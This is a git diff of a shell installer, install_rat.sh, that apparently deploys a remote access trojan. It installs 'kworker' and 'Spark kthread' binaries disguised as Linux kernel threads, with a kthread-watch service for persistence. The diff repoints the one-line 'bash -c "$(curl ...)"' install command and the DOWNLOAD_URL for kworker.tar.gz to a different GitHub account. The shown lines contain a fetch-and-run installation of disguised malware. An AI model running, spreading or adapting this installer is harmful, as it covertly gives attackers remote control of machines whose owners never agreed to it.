@@ -4,9 +4,9 @@
 # kworker + Spark kthread one-click installer (install_rat.sh)
 # Original kworker-only installer: install.sh
 # Usage:
-#   bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install_rat.sh)"
+#   bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/install_rat.sh)"
 # Package:
-#   https://raw.githubusercontent.com/wondream322/kworker/master/kworker.tar.gz
+#   https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kworker.tar.gz
 # ============================================
 
 set -euo pipefail
@@ -22,7 +22,7 @@ KTHREAD_BIN="${KTHREAD_DIR}/kthread"
 KTHREAD_WATCH="${KTHREAD_DIR}/watch.sh"
 SERVICE_NAME="kthread"
 WATCH_SERVICE_NAME="kthread-watch"
-DOWNLOAD_URL="${DOWNLOAD_URL:-https://raw.githubusercontent.com/wondream322/kworker/master/kworker.tar.gz}"
+DOWNLOAD_URL="${DOWNLOAD_URL:-https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kworker.tar.gz}"
 
 print_info()    { echo -e "${GREEN}[INFO]${NC} $1"; }
 print_warn()    { echo -e "${YELLOW}[WARN]${NC} $1"; }
